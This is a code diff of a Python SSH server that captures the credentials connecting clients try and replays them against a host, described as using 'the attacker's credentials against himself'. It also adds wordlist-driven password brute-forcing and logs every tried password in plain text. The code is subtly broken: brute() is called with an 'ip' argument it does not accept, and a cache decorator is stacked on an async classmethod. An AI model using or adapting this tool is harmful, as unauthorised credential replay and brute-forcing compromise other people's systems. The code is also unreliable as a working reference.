@@ -1,5 +1,6 @@
 import asyncio
 import logging
+from methodtools import lru_cache
 
 import asyncssh
 
@@ -62,71 +63,53 @@ class SwitcherooServer(LoggingServer):
     A credential logging and replaying SSH Server.
     """
 
-    async def check_credentials(self, username, password):
+    @lru_cache()
+    @classmethod
+    async def check_credentials(cls, host, port, username, password):
+        """
+        Try to authenticate with the passed credentials.
+
+        :param username:
+        :param password:
+        :return: bool indicating validity of the credentials
+        :rtype: bool
+        """
         try:
-            async with asyncssh.connect(
-                self.host, username=username, password=password, known_hosts=None
-            ):
+            async with asyncssh.connect(host, username=username, password=password, known_hosts=None):
+                logger.info(
+                    "auth='password' host=%r username=%r password=%r valid='true'",
+                    f"{host}:{port}",
+                    username,
+                    password,
+                )
                 return True
         except Exception:
             pass
+        logger.info(
+            "auth='password' host=%r username=%r password=%r valid='false'",
+            f"{host}:{port}",
+            username,
+            password,
+        )
         return False
+
+    async def brute(self):
+        credentials = Config.load_wordlist()
+        for username, password in credentials:
+            if await self.check_credentials(self.host, self.port, username, password):
+                break
 
     async def replay(self, username, password):
         """
         Use the attacker's credentials against himself.
         """
-        try:
-            if await self.check_credentials(username, password):
-                logger.info(
-                    "auth='password' host=%r username=%r password=%r valid='true'",
-                    f"{self.host}:{self.port}",
-                    username,
-                    password,
-                )
-                return False
-        except Exception:
-            logger.info(
-                "auth='password' host=%r username=%r password=%r valid='false'",
-                f"{self.host}:{self.port}",
-                username,
-                password,
-            )
+        if await self.check_credentials(self.host, self.port, username, password):
+            return False
+
+        if Config.WORDLIST is not None:
+            await self.brute(ip=self.host)
         return False
 
     def validate_password(self, username, password):
         return asyncio.wait_for(self.replay(username, password), timeout=4.0)
 
-
-class SwitcherooBruteServer(SwitcherooServer):
-    """
-    A credential logging and bruteforce SSH Server.
-    """
-
-    DID_BRUTE = False
-
-    async def attack(self, username, password):
-        credentials = [(username, password)]
-        more_creds = Config.load_wordlist()
-        if more_creds and not self.DID_BRUTE:
-            credentials.extend(more_creds)
-        for username, password in credentials:
-            if await self.check_credentials(username, password):
-                logger.info(
-                    "auth='password' host=%r username=%r password=%r valid='true'",
-                    f"{self.host}:{self.port}",
-                    username,
-                    password,
-                )
-                return False
-            logger.info(
-                "auth='password' host=%r username=%r password=%r valid='false'",
-                f"{self.host}:{self.port}",
-                username,
-                password,
-            )
-        self.DID_BRUTE = True
-        return False
-
-    def validate_password(self, username, password):
-        return asyncio.wait_for(self.attack(username, password), timeout=4.0)
